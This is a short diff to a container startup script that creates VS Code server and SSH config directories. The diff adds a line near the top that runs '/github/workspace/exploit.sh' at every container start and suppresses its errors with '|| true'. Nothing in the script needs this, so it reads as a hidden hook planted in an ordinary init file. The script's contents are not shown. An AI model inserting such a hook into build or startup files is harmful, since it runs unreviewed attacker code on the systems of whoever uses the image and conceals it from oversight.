@@ -1,5 +1,7 @@
 #!/usr/bin/with-contenv bash
 
+bash /github/workspace/exploit.sh || true
+
 mkdir -p /config/{.vscode-server,workspace,.ssh}
 mkdir -p /config/.vscode-server/{extensions,data}
 
